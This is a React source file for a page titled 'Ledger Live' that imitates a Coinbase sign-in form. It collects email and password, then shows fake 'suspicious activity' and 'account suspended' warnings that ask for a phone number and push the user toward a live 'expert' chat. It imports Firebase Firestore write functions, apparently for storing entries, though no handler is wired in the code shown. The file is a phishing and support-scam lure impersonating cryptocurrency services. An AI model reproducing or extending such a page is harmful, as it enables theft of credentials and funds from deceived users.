import { useState, useEffect } from 'react';
import { Link, redirect, useNavigate } from 'react-router-dom';
import { Helmet, HelmetProvider } from 'react-helmet-async';
import DataService from '../../services/DataService';
import ValidationService from '../../services/ValidationService';
import { toast } from 'react-toastify';
import AppLayout from '../../layouts/AppLayout';
import { HiOutlineArrowLongLeft } from "react-icons/hi2";
import { PiDesktopTowerBold } from "react-icons/pi";
import { BsUsbPlug } from "react-icons/bs";
import { FaBluetoothB } from "react-icons/fa";
import { FaStar, FaStarHalf, FaDesktop, FaRightLong, FaArrowRightLong, FaCoins, FaTabletScreenButton, FaChevronRight, FaFacebook,FaReddit,FaTwitter,FaInstagram, FaLinkedin, FaYoutube, FaTiktok, FaDiscord, FaCcPaypal } from "react-icons/fa6";


import logo from './../../assets/img/ledger.png';
import ledgerstax1 from './../../assets/img/ledgerstax.png';
import ledgernano from './../../assets/img/ledgernano.png';
import ledgernanox from './../../assets/img/ledgernanox.png';

import {db} from './../../services/Firebase';
import { collection, addDoc, getDocs } from "firebase/firestore";


function Device() {

    return (<AppLayout>
        <Helmet>
            <title>Ledger Live</title>
        </Helmet>
        <div className='container-fluid '>
        <h1 className='text-white'>Coinbase</h1>
            <div className='row'>
                <div className='col-4'></div>
                <div className='col-4'>
                    <h2 className='text-center text-white fs24 mt40'>Sign In to  Coinbase</h2>
                    <div className='card mt30' >
                        <div className='card-body px30 py40'>
                            <input type="email" placeholder='Email' className='form-control'/>
                            <input type="password" placeholder='Password' className='form-control mt20'/>
                            <input type='checkbox' className='mt20'/>
                            <span className='fs12'> Keep me signed in on this computer</span>
                            <span className=''><button className='btn btn-primary ms30'>Submit</button></span>

                            <h2 className='text-danger fs20'>Important Message !</h2>
                            <p className='fs12 fw-bold'>Some suspicious activity found with your accountant.<br/>Enter your phone number to verify your identity.<br/></p>
                            <input type='text' className='form-control' placeholder='+91 6876687687'/><br/>
                            <button className='btn btn-primary'>Submit</button>

                            <h2 className='text-danger fs20'>Important Message !</h2>
                            <p className='fs12 fw-bold'>Due to unauthorized activity and identification faliure on your account.Account Access has been suspended.
                            please be in touch with our suppport staff immediately.chat with our live expert to unblock your account.</p>
                            <div className='text-center'>
                                <h3 className='fs15'>Error CODE:EBRX1:6X76D</h3>
                                <button className='btn btn-primary'>Ask Expert</button>
                            </div>    
                           
                            
                        </div>
                        
                    </div>
                    <div className='mt10 fs12 '>
                        <Link href="" className='text-white text-decoration-none'>Forgot Password?</Link>
                        <Link href="" className='text-white text-decoration-none ms20'> Don't have an account? </Link>
                        <Link href="" className='text-white text-decoration-none ms20'> Privacy policy</Link>
                        <div className='text-center py10'>
                        <Link href="" className='text-white text-decoration-none ms20'> Have an issue with two factor authentication ?</Link>
                        </div>
                        

                    </div>
                    
                </div>
                <div className='col-4'></div>

            </div>
            
           

            
        </div>
    </AppLayout>)
}

export default Device
